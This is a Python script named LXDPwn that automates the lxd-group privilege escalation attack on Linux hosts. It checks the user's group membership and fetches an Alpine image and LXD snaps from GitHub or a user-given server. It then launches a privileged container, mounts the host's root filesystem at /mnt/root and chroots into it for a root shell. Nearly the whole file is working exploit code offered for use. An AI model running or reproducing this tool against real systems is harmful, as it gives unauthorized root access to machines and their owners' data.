#!/usr/bin/env python3

import requests
import os
import hashlib
import sys
import subprocess
import pwd
import grp
import time
import re

class S:
    H = '\033[95m'
    B = '\033[94m'
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    C = '\033[96m'
    M = '\033[95m'
    W = '\033[97m'
    O = '\033[1m'
    U = '\033[4m'
    E = '\033[0m'
    

    INFO = "ℹ "
    SUCCESS = "✓ "
    ERROR = "✗ "
    WARNING = "⚠ "
    DOWNLOAD = "↓ "
    INSTALL = "⚙ "
    CONTAINER = "📦"
    SHELL = "💻 "
    CLEAN = "🧹"
    WAIT = "⏳"
    ARROW = "→ "
    STAR = "⭐ "
    GITHUB = "🐙 "

def print_banner():
   
    banner = S.R+"""
 _    __  ______  ______        ___   _ 
| |   \ \/ /  _ \|  _ \ \      / / \ | |
| |    \  /| | | | |_) \\ /\ / /|  \| |
| |___ /  \| |_| |  __/ \ V  V / | |\  |
|_____/_/\_\____/|_|     \_/\_/  |_| \_|
               @jacstory

"""
    print(banner)
def print_step(icon, color, step, message):
    print(f"{color}{icon} {S.O}{step:12}{S.E} {color}│{S.E} {message}{S.E}")
def print_substep(message):
    print(f"    {S.C}└─{S.E} {message}")
def print_progress_bar(current, total, filename, bar_length=30): 
    percent = float(current) * 100 / total
    filled = int(bar_length * current // total)
    bar = '█' * filled + '░' * (bar_length - filled)
    current_mb = current / (1024 * 1024)
    total_mb = total / (1024 * 1024)
    
    sys.stdout.write(f"\r    {S.C}↓{S.E} {S.O}{filename[:25]:25}{S.E} "
                     f"{S.G}[{bar}]{S.E} "
                     f"{S.W}{percent:5.1f}%{S.E} "
                     f"{S.M}({current_mb:5.1f}/{total_mb:5.1f} MB){S.E}")
    sys.stdout.flush()
def print_section(title):
    print()
    print(f"{S.Y}{S.O}═══ {title} ═══{S.E}")
    print()
def print_success_box(message):
    length = len(message) + 6
    print(f"{S.G}┌{'─' * length}┐{S.E}")
    print(f"{S.G}│  {message}  │{S.E}")
    print(f"{S.G}└{'─' * length}┘{S.E}")
if not hasattr(subprocess, 'run'):
    print_step(S.ERROR, S.R, "ERROR", "Python 3.5+ required")
    sys.exit(1)
def run_cmd_compat(cmd, **kwargs):
    if 'text' in kwargs:
        kwargs['universal_newlines'] = kwargs.pop('text')
    if 'capture_output' in kwargs:
        kwargs['stdout'] = subprocess.PIPE
        kwargs['stderr'] = subprocess.PIPE
        del kwargs['capture_output']
    return subprocess.run(cmd, **kwargs)    
class LXD_Helper:
    def __init__(self):
        print_banner()
        self.download_path = "/tmp/alpine"
        os.makedirs(self.download_path, exist_ok=True)
        self.need_sudo = False           
        self.need_sudo_for_system = False
        self.online_mode = False
        self.lxd_installed = False
        self.lxd_initialized = False
        self.snap_available = False
        self.glibc_version = self.get_glibc_version()
        self.required_files = {
            "alpine-v3.13-x86_64-20210218_0139.tar.gz": "Alpine Linux",
            "core_17272.assert": "Core Assert",
            "core_17272.snap": "Core Snap",
            "lxd_37395.assert": "LXD Assert",
            "lxd_37395.snap": "LXD Snap",
            "snapd_2.71-3+b1_amd64.deb": "Snapd",
        }
        print_section("INITIALIZATION")
        print_step(S.INFO, S.B, "WORKSPACE", f"Download directory: {self.download_path}")
        if self.glibc_version:
            print_substep(f"System glibc: {self.glibc_version}")
        print()
        self.Check_compatibility()
        print(f"    {S.C}────────────────────────────────────────────{S.E}")
        print()
        self.check_snap_availability()
        self.Check_LXD_Status()
        alpine_path = os.path.join(self.download_path, "alpine-v3.13-x86_64-20210218_0139.tar.gz")
        alpine_exists = os.path.exists(alpine_path)
        if self.lxd_installed and self.lxd_initialized and alpine_exists:
            print_section("CONTAINER SETUP")
            self.ImageLoad(alpine_path)
            return
        print_section("NETWORK CONFIGURATION")
        self.online_mode = self.check_connection()
        missing_files = self.check_missing_files()
        if missing_files:
            print_step(S.WARNING, S.Y, "FILES", f"Missing {len(missing_files)} files")
            if self.online_mode:
                base_url = "https://github.com/jac11/LXDPwn/releases/download/LXDPwn/"
                print_step(S.INFO, S.B, "ONLINE", "Will download missing files from GitHub")
                print_section("FILE DOWNLOAD")
                self.download_missing_files(base_url, missing_files)
            else:
                base_url = self.get_offline_server()
                available_files = self.check_offline_files_silent(base_url)
                if available_files:
                    files_to_download = [f for f in missing_files if f in available_files]
                    
                    if files_to_download:
                        print_section("FILE DOWNLOAD")
                        self.download_missing_files(base_url, files_to_download)
                    else:
                        print_step(S.SUCCESS, S.G, "FILES", "All required files already exist locally")
                else:
                    print_step(S.ERROR, S.R, "ERROR", "No files found on offline server!")
                    print_substep(f"Make sure your web server is running at {base_url}")
                    print_substep("And the following files are present:")
                    for f in missing_files:
                        print_substep(f"  - {f}")
                    sys.exit(1)
        else:
            print_step(S.SUCCESS, S.G, "FILES", "All required files already exist")
        if not os.path.exists(alpine_path):
            print_step(S.ERROR, S.R, "ERROR", "Alpine image not found! Cannot continue.")
            sys.exit(1)
        if not (self.lxd_installed and self.lxd_initialized):
            print_section("LXD INSTALLATION")
            self.Set_LXD()
        if self.lxd_installed and self.lxd_initialized:
            print_section("CONTAINER SETUP")
            self.ImageLoad(alpine_path)
        else:
            print_step(S.ERROR, S.R, "ERROR", "LXD installation failed - cannot setup container")
            print_substep("Try installing LXD manually: sudo apt install lxd lxd-client")
    def check_missing_files(self):
        missing = []
        for filename in self.required_files.keys():
            filepath = os.path.join(self.download_path, filename)
            if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
                missing.append(filename)
        return missing
    def check_offline_files_silent(self, base_url):
        for filename in self.required_files.keys():
            try:
                available = []
                response = requests.head(base_url + filename, timeout=5)
                if response.status_code == 200:
                    available.append(filename)
            except requests.RequestException:
                pass
        return available
    def download_missing_files(self, base_url, missing_files):
        print_step(S.DOWNLOAD, S.C, "START", f"Downloading {len(missing_files)} missing files...")
        print()
        total_files = len(missing_files)
        completed = 0
        total_bytes = 0
        print(f"    {S.C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{S.E}")
        print()
        for filename in missing_files:
            short_name = self.required_files[filename]
            save_path = os.path.join(self.download_path, filename)
            try:
                response = requests.get(base_url + filename, stream=True, timeout=15)
                response.raise_for_status()
                total_size = int(response.headers.get('content-length', 0))
                downloaded = 0
                sys.stdout.write(f"    {S.C}↓{S.E} {short_name:15} ")
                sys.stdout.write(f"{S.W}[{S.E}{'░' * 20}{S.W}]{S.E} 0%")
                sys.stdout.flush()
                with open(save_path, "wb") as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                            if total_size > 0:
                                percent = int(20 * downloaded / total_size)
                                bar = '█' * percent + '░' * (20 - percent) 
                                sys.stdout.write(f"\r    {S.C}↓{S.E} {short_name:15} ")
                                sys.stdout.write(f"{S.G}[{bar}]{S.E} ")
                                sys.stdout.write(f"{S.W}{int(100 * downloaded / total_size):3d}%{S.E}")
                                sys.stdout.flush()
                sys.stdout.write(f"\r    {S.G}✓{S.E} {short_name:15} ")
                sys.stdout.write(f"{S.G}[{'█' * 20}]{S.E} ")
                sys.stdout.write(f"{S.W}100%{S.E} ")
                sys.stdout.write(f"{S.M}({downloaded/1024/1024:5.1f} MB){S.E}\n")
                total_bytes += downloaded
                completed += 1
            except requests.RequestException as e:
                sys.stdout.write(f"\r    {S.R}✗{S.E} {short_name:15} {S.R}Failed{S.E}\n")
                print_substep(f"Error: {str(e)[:50]}")
                if not self.online_mode:
                    print_substep(f"Make sure file exists on server: {base_url}{filename}")
        print()
        print(f"    {S.C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{S.E}")
        print_step(S.SUCCESS, S.G, "SUMMARY", f"Downloaded {completed}/{len(missing_files)} files")
        print_substep(f"Total size: {S.M}{total_bytes/(1024*1024):.1f} MB{S.E}")
    def get_glibc_version(self):
        try:
            result = subprocess.run(["ldd", "--version"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   universal_newlines=True)
            version_match = re.search(r'(\d+\.\d+)', result.stdout)
            if version_match:
                return version_match.group(1)
        except:
            pass
        return None
    def check_snap_availability(self):
        print_step(S.INFO, S.B, "SNAP", "Checking snap availability...")   
        try:
            result = subprocess.run(["which", "snap"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            if result.returncode == 0:
                result = subprocess.run(["snap", "version"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,universal_newlines=True)
                if result.returncode == 0:
                    self.snap_available = True
                    print_step(S.SUCCESS, S.G, "SNAP", "Snap is available")
                    return True
        except:
            pass
        self.snap_available = False
        print_step(S.WARNING, S.Y, "SNAP", "Snap is NOT available")
        return False
    def check_sudo_access(self):
        """Check if user has sudo access and cache password once"""
        print_step(S.INFO, S.B, "SUDO", "Checking sudo access...")
        
        try:
            # Test if sudo is already cached
            subprocess.run(["sudo", "-n", "true"], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,check=True)
            print_step(S.SUCCESS, S.G, "SUDO", "Sudo access available (cached)")
            print()
            return True
        except subprocess.CalledProcessError:
            print_step(S.WARNING, S.Y, "SUDO", "Password required for some operations")
            print()
            try:
                result = subprocess.run(["sudo", "-v"], stderr=subprocess.PIPE,universal_newlines=True)
                if result.returncode == 0:
                    print_step(S.SUCCESS, S.G, "SUDO", "Authentication successful")
                    print()
                    return True
                else:
                    print_step(S.ERROR, S.R, "SUDO", "Authentication failed")
                    return False 
            except KeyboardInterrupt:
                print()
                print_step(S.ERROR, S.R, "SUDO", "Authentication cancelled")
                sys.exit(1)
            except Exception as e:
                print_step(S.ERROR, S.R, "SUDO", f"Error: {str(e)}")
                return False            
    def run_cmd(self, cmd, **kwargs):
        system_cmds = ['apt', 'apt-get', 'dpkg', 'usermod', 'systemctl']
        if 'text' in kwargs:
            kwargs['universal_newlines'] = kwargs.pop('text')
        if 'capture_output' in kwargs:
            kwargs['stdout'] = subprocess.PIPE
            kwargs['stderr'] = subprocess.PIPE
            del kwargs['capture_output']
        if cmd[0] in system_cmds and self.need_sudo_for_system:
            if cmd[0] != "sudo":
                cmd = ["sudo"] + cmd
        elif self.need_sudo and cmd[0] != "sudo":
            cmd = ["sudo"] + cmd        
        return subprocess.run(cmd, **kwargs) 
    def run_cmd_quiet(self, cmd, **kwargs):
        system_cmds = ['apt', 'apt-get', 'dpkg', 'usermod', 'systemctl']
        if 'text' in kwargs:
            kwargs['universal_newlines'] = kwargs.pop('text')
        if 'capture_output' in kwargs:
            kwargs['stdout'] = subprocess.PIPE
            kwargs['stderr'] = subprocess.PIPE
            del kwargs['capture_output']
        if cmd[0] in system_cmds and self.need_sudo_for_system:
            if cmd[0] != "sudo":
                cmd = ["sudo"] + cmd
        elif self.need_sudo and cmd[0] != "sudo":
            cmd = ["sudo"] + cmd
        if 'stdout' not in kwargs:
            kwargs['stdout'] = subprocess.DEVNULL
        if 'stderr' not in kwargs:
            kwargs['stderr'] = subprocess.DEVNULL
        return subprocess.run(cmd, **kwargs)
    def run_lxc_cmd(self, cmd, **kwargs):
        if 'text' in kwargs:
            kwargs['universal_newlines'] = kwargs.pop('text')
        if 'capture_output' in kwargs:
            kwargs['stdout'] = subprocess.PIPE
            kwargs['stderr'] = subprocess.PIPE
            del kwargs['capture_output']
        return subprocess.run(cmd, **kwargs)
    def cleanup(self):
        print_step(S.CLEAN, S.Y, "CLEANUP", "Stopping and removing containers...")
        self.run_lxc_cmd(["lxc", "stop", "alpine-container", "--force"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.run_lxc_cmd(["lxc", "delete", "alpine-container"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.run_lxc_cmd(["lxc", "image", "delete", "alpine-local"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print_step(S.SUCCESS, S.G, "DONE", "Cleanup completed successfully")
    def Check_compatibility(self):
        print_step(S.INFO, S.B, "SYSTEM", "Checking system compatibility...")
        username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
        user_info = pwd.getpwnam(username)
        groups = [
            g.gr_name for g in grp.getgrall()
            if username in g.gr_mem or g.gr_gid == user_info.pw_gid
        ]  
        print_substep(f"User: {username}")
        print_substep(f"Groups: {', '.join(groups)}")
        is_root = os.geteuid() == 0
        in_lxd_group = "lxd" in groups 
        if is_root:
            print_step(S.SUCCESS, S.G, "OK", "Running as root — full access granted")
            self.need_sudo = False
            self.need_sudo_for_system = False
            return True
        elif in_lxd_group:
            print_step(S.SUCCESS, S.G, "OK", f"User in lxd group — container access granted")
            self.need_sudo = False
            self.need_sudo_for_system = True
            return True
        else:
            print_step(S.ERROR, S.R, "ERROR", f"User {username} not in lxd group and not root")
            print_substep("Add user to lxd group: sudo usermod -aG lxd " + username)
            print_substep("Then log out and back in")
            sys.exit(1)
    def check_connection(self):
        print_step(S.INFO, S.B, "NETWORK", "Checking internet connection...")
        try:
            requests.get("https://github.com", timeout=5)
            print_step(S.SUCCESS, S.G, "ONLINE", "Connection established")
            return True
        except requests.RequestException:
            print_step(S.WARNING, S.Y, "OFFLINE", "No internet connection detected")
            return False
    def get_offline_server(self):
        print_step(S.INFO, S.B, "SERVER", "Configure offline server")
        print()
        print(f"    {S.C}┌─{S.E} {S.O}Offline Server Configuration{S.E}")
        print(f"    {S.C}├─{S.E} {S.Y}Start offline_lxd.py server first{S.E}")
        print(f"    {S.C}└─{S.E}")
        print()
        server_ip = input(f"    {S.C}└─ Enter server IP{S.E} : ").strip()
        try:
            server_port = int(input(f"    {S.C}└─ Enter Port (default 80){S.E}: "))
        except ValueError:
            server_port = 80 
        print()
        print_step(S.SUCCESS, S.G, "SERVER", f"Configured: {S.O}{server_ip}:{server_port}{S.E}")
        return f"http://{server_ip}:{server_port}/"
    def download_files(self, base_url):
        missing = self.check_missing_files()
        if missing:
            self.download_missing_files(base_url, missing)
        else:
            print_step(S.SUCCESS, S.G, "FILES", "All files already downloaded")
    def Check_LXD_Status(self):
        print_step(S.INFO, S.B, "STATUS", "Checking LXD installation status...")
        self.snap_installed = False
        self.lxd_installed = False
        self.lxd_initialized = False
        try:
            result = subprocess.run(["snap", "version"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
            if result.returncode == 0:
                version = result.stdout.split('\n')[0].split()[-1] if result.stdout else "unknown"
                print_step(S.SUCCESS, S.G, "SNAP", f"snapd is installed (v{version})")
                self.snap_installed = True
            else:
                print_step(S.WARNING, S.Y, "SNAP", "snapd not installed")
        except:
            print_step(S.WARNING, S.Y, "SNAP", "snapd not installed")
        try:
            result = subprocess.run(["lxc", "info"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if "version" in line.lower():
                        version = line.split(':')[-1].strip()
                        print_step(S.SUCCESS, S.G, "LXD", f"LXD is installed (v{version})")
                        self.lxd_installed = True
                        break
                if "storage" in result.stdout.lower() or "images" in result.stdout.lower():
                    print_step(S.SUCCESS, S.G, "INIT", "LXD is initialized")
                    self.lxd_initialized = True
                else:
                    print_step(S.WARNING, S.Y, "INIT", "LXD not initialized")
            else:
                print_step(S.WARNING, S.Y, "LXD", "LXD not installed")
        except:
            print_step(S.WARNING, S.Y, "LXD", "LXD not installed")
            
        if self.lxd_installed and self.lxd_initialized:
            print_step(S.SUCCESS, S.G, "READY", "LXD is fully ready")
        else:
            print_step(S.INFO, S.B, "NEXT", "Installation required")
    def Set_LXD(self):
        print_step(S.INSTALL, S.M, "BEGIN", "Starting LXD installation...")
        print()
        if self.lxd_installed and self.lxd_initialized:
            print_step(S.SUCCESS, S.G, "OK", "LXD already installed and initialized")
            return True
        if not self.online_mode:
            print_step(S.INFO, S.B, "OFFLINE", "Offline mode detected")
            print_substep("Trying local snap installation first...")

            if self.install_lxd_via_snap():
                return True
            print_substep("Snap failed, trying apt as fallback...")
            return self.install_lxd_via_apt()
        print_step(S.INFO, S.B, "ONLINE", "Online mode detected - trying snap installation")

        snapd_installed = False
        try:
            subprocess.run(["snap", "version"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
            snapd_installed = True
            print_substep("Snapd is already installed")
        except:
            print_substep("Snapd not installed")
        if not snapd_installed:
            print_substep("Online mode - installing snapd via apt...")
            try:
                self.run_cmd_quiet(["apt", "update"], check=True)
                self.run_cmd_quiet(["apt", "install", "snapd", "-y"], check=True)
                print_substep("Snapd installed via apt")
                time.sleep(3)
            except subprocess.CalledProcessError as e:
                print_step(S.WARNING, S.Y, "SNAP", f"Failed to install snapd: {e}")
                print_substep("Falling back to apt installation...")
                return self.install_lxd_via_apt()
        try:
            subprocess.run(["snap", "version"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
            print_substep("Snapd is working")
        except:
            print_step(S.WARNING, S.Y, "SNAP", "Snapd not responding")
            print_substep("Falling back to apt installation...")
            return self.install_lxd_via_apt()
        core_snap = os.path.join(self.download_path, "core_17272.snap")
        lxd_snap = os.path.join(self.download_path, "lxd_37395.snap")
        
        if not os.path.exists(core_snap) or not os.path.exists(lxd_snap):
            print_step(S.WARNING, S.Y, "FILES", "Snap files not found")
            print_substep("Falling back to apt installation...")
            return self.install_lxd_via_apt()
        print(f"    {S.C}[1/2]{S.E} Installing LXD via snap... ", end="", flush=True)
        try:
            result = subprocess.run(["snap", "install", "--dangerous", lxd_snap],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
            if result.returncode != 0:
                print(f"{S.Y}⚠{S.E}")
                print_substep(f"Snap failed: {result.stderr.strip()}")
                print_substep("Falling back to apt installation...")
                return self.install_lxd_via_apt()
            print(f"{S.G}✓{S.E}")
        except Exception as e:
            print(f"{S.R}✗{S.E}")
            print_substep(f"Error: {str(e)}")
            print_substep("Falling back to apt installation...")
            return self.install_lxd_via_apt()
        print(f"    {S.C}[2/2]{S.E} Initializing LXD... ", end="", flush=True)
        try:
            subprocess.run(["lxd", "init", "--auto"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
            print(f"{S.G}✓{S.E}")
        except:
            print(f"{S.R}✗{S.E}")
            return False
        try:
            username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
            self.run_cmd_quiet(["usermod", "-aG", "lxd", username], check=True)
            print_substep(f"Added {username} to lxd group")
        except:
            print_substep("Warning: Could not add user to lxd group")
        print_step(S.SUCCESS, S.G, "DONE", "LXD installed successfully via snap")
        self.lxd_installed = True
        self.lxd_initialized = True
        return True    
    def install_lxd_via_snap(self):
        try:
            subprocess.run(["systemctl", "start", "snapd"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        except:
            pass

        time.sleep(3)
        commands = []
        if not self.snap_installed:
            # Find snapd file
            snapd_file = None
            for f in os.listdir(self.download_path):
                if f.startswith("snapd") and f.endswith(".deb"):
                    snapd_file = os.path.join(self.download_path, f)
                    break
            
            if snapd_file:
                commands.append({
                    "cmd": ["dpkg", "-i", snapd_file],
                    "desc": f"Installing {os.path.basename(snapd_file)}"
                })
            else:
                print_step(S.WARNING, S.Y, "SNAP", "No snapd package found")
                return False
        core_assert = os.path.join(self.download_path, "core_17272.assert")
        core_snap = os.path.join(self.download_path, "core_17272.snap")
        lxd_assert = os.path.join(self.download_path, "lxd_37395.assert")
        lxd_snap = os.path.join(self.download_path, "lxd_37395.snap")
        
        if os.path.exists(core_assert) and os.path.exists(core_snap):
            commands.extend([
                {
                    "cmd": ["snap", "ack", core_assert],
                    "desc": "Acknowledging core snap"
                },
                {
                    "cmd": ["snap", "install", core_snap],
                    "desc": "Installing core snap"
                }
            ])
        
        if os.path.exists(lxd_assert) and os.path.exists(lxd_snap):
            commands.extend([
                {
                    "cmd": ["snap", "ack", lxd_assert],
                    "desc": "Acknowledging LXD snap"
                },
                {
                    "cmd": ["snap", "install", lxd_snap],
                    "desc": "Installing LXD snap"
                }
            ])
        if not commands:
            print_step(S.ERROR, S.R, "ERROR", "No snap packages found")
            return False
        for i, cmd_info in enumerate(commands, 1):
            cmd = cmd_info["cmd"]
            desc = cmd_info["desc"]
            print(f"    {S.C}[{i}/{len(commands)}]{S.E} {desc}... ", end="", flush=True)
            try:
                if cmd[0] == "dpkg":
                    result = self.run_cmd(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=False)
                    if result.returncode != 0:
                        print(f"{S.Y}⚠{S.E}")
                        print_substep("Fixing dependencies...")
                        self.run_cmd_quiet(["apt-get", "install", "-f", "-y"], check=False)
                        self.run_cmd_quiet(cmd, check=True)
                    else:
                        print(f"{S.G}✓{S.E}")
                else:
                    subprocess.run(cmd,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
                    print(f"{S.G}✓{S.E}")
                    
            except subprocess.CalledProcessError:
                print(f"{S.R}✗{S.E}")
                return False

        print(f"    {S.C}[{len(commands)+1}/{len(commands)+1}]{S.E} Initializing LXD... ", end="", flush=True)
        try:
            subprocess.run(["lxd", "init", "--auto"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
            print(f"{S.G}✓{S.E}")
            print_step(S.SUCCESS, S.G, "DONE", "LXD installed via snap")
            self.lxd_installed = True
            self.lxd_initialized = True
            return True
        except:
            print(f"{S.R}✗{S.E}")
            return False
    def install_lxd_via_apt(self):
        print_step(S.INSTALL, S.M, "APT", "Installing LXD via apt...")
        try:
            subprocess.run(["apt", "--version"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
        except:
            print_step(S.ERROR, S.R, "FAIL", "apt command not found")
            return False
        
        steps = [
            ("Updating package list", ["apt", "update"]),
            ("Installing LXD", ["apt", "install", "lxd", "-y"]),
            ("Adding user to lxd group", ["usermod", "-aG", "lxd"]),
            ("Initializing LXD", ["lxd", "init", "--auto"])
        ]
        if not self.online_mode:
            print_substep("Offline mode - skipping apt update")
            steps = steps[1:]
        total_steps = len(steps)
        for i, (desc, cmd) in enumerate(steps, 1):
            print(f"    {S.C}[{i}/{total_steps}]{S.E} {desc}... ", end="", flush=True)
            
            if cmd[0] == "usermod":
                username = os.getenv("SUDO_USER") or pwd.getpwuid(os.getuid()).pw_name
                full_cmd = cmd + [username]
            else:
                full_cmd = cmd
            try:
                if cmd[0] in ['apt', 'apt-get']:
                    self.run_cmd_quiet(full_cmd, check=True)
                else:
                    subprocess.run(full_cmd,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
                print(f"{S.G}✓{S.E}")
            except subprocess.CalledProcessError as e:
                print(f"{S.R}✗{S.E}")
                print_substep(f"Error: {str(e)[:50]}")
                return False
        print_step(S.SUCCESS, S.G, "DONE", "LXD installed successfully via apt")
        self.lxd_installed = True
        self.lxd_initialized = True
        return True
    def ImageLoad(self, imagepath):
        self.cleanup()
        print_step(S.CONTAINER, S.C, "START", "Setting up container...")
        print()
        print_step(S.INSTALL, S.M, "LXD", "Ensuring LXD is initialized...")
        try:
            subprocess.run(["lxd", "init", "--auto"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,check=True)
            print_step(S.SUCCESS, S.G, "OK", "LXD is ready")
        except subprocess.CalledProcessError:
            print_step(S.ERROR, S.R, "FAIL", "LXD initialization failed")
            return
        print_step(S.DOWNLOAD, S.C, "IMAGE", "Checking Alpine image...")
        result = subprocess.run(["lxc", "image", "list", "alpine-local", "--format", "json"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
        if result.returncode == 0 and 'alpine-local' in result.stdout:
            print_step(S.SUCCESS, S.G, "EXISTS", "Image already loaded")
        else:
            print_step(S.DOWNLOAD, S.C, "IMPORT", "Importing Alpine image...")
            try:
                result = subprocess.run(["lxc", "image", "import", imagepath, "--alias", "alpine-local"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
                if result.returncode != 0:
                    print_step(S.ERROR, S.R, "FAIL", f"Import failed: {result.stderr.strip()}")
                    return
                fingerprint = result.stdout.split(':')[-1].strip()[:]
                print_step(S.SUCCESS, S.G, "FPRINT", f"Image imported (fingerprint: {fingerprint})")     
                print_step(S.SUCCESS, S.G, "IMPORT", "Image imported successfully")
            except Exception as e:
                print_step(S.ERROR, S.R, "FAIL", f"Image import failed: {str(e)}")
                return
        print_step(S.CONTAINER, S.C, "LAUNCH", "Launching privileged container...")
        try:
            result = subprocess.run([
                "lxc", "launch",
                "alpine-local",
                "alpine-container",
                "-c", "security.privileged=true",
                "-c", "security.nesting=true"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, check=False)
            if result.returncode != 0:
                print_step(S.ERROR, S.R, "FAIL", "Container launch failed")
                print_substep(f"Error: {result.stderr.strip()}")
                print_substep("Checking for existing container...")
                check = subprocess.run(["lxc", "list", "alpine-container", "--format", "json"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
                if 'alpine-container' in check.stdout:
                    print_substep("Container already exists, trying to use it...")
                else:
                    image_check = subprocess.run(["lxc", "image", "list", "alpine-local", "--format", "json"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
                    if 'alpine-local' not in image_check.stdout:
                        print_substep("Image 'alpine-local' not found!")
                    return
            else:
                print_step(S.SUCCESS, S.G, "START", "Container is running")
                time.sleep(2)
            status = subprocess.run(["lxc", "list", "alpine-container", "--format", "json"],stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True)
            print_substep(f"Container: {S.O}alpine-container{S.E}")       
        except Exception as e:
            print_step(S.ERROR, S.R, "FAIL", f"Container launch failed: {str(e)}")
            return
        print_step(S.INSTALL, S.M, "MOUNT", "Mounting host filesystem...")
        try:
            result = subprocess.run([
                "lxc", "config", "device", "add",
                "alpine-container",
                "host-root",
                "disk",
                "source=/",
                "path=/mnt/root",
                "recursive=true"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE,universal_newlines=True, check=True)
            print_step(S.SUCCESS, S.G, "MOUNT", "Host filesystem mounted at /mnt/root")
            shells = [
                ["lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/bash"],
                ["lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/sh"],
                ["lxc", "exec", "alpine-container", "--", "chroot", "/mnt/root", "/bin/ash"]
            ]
            shell_success = False
            for shell_cmd in shells:
                try:
                    subprocess.run(shell_cmd, check=False)
                    shell_success = True
                    break
                except:
                    continue
                    
            if not shell_success:
                print_substep("Could not get shell, but container is running") 
        except subprocess.CalledProcessError as e:
            print_step(S.ERROR, S.R, "FAIL", f"Failed to mount host filesystem: {str(e)}")
            subprocess.run(["lxc", "exec", "alpine-container", "--", "/bin/sh"], check=False)
            return
        print()
        print_success_box("🎉 Container is ready! Opening shell.. 🎉")
        print()
        print(f"    {S.Y}┌─{S.E} {S.O}Container Access{S.E}")
        print(f"    {S.Y}├─{S.E} Host filesystem: {S.C}/mnt/root{S.E}")
        print(f"    {S.Y}├─{S.E} Container name: {S.C}alpine-container{S.E}")
        print(f"    {S.Y}└─{S.E} Type {S.R}'exit'{S.E} to close the shell")
        print()
        subprocess.run(["lxc", "exec", "alpine-container", "--", "/bin/sh"], check=False)  
        print()
        print_step(S.INFO, S.B, "SHELL", "Shell session ended")
        cleanup = input(f"    {S.Y}Cleanup container? (y/n){S.E}: ").strip().lower()
        if cleanup == 'y':
            self.cleanup()
if __name__ == '__main__':
    try:
        LXD_Helper()
    except KeyboardInterrupt:
        print()
        print_step(S.WARNING, S.Y, "EXIT", "Script interrupted by user")
        sys.exit(0)
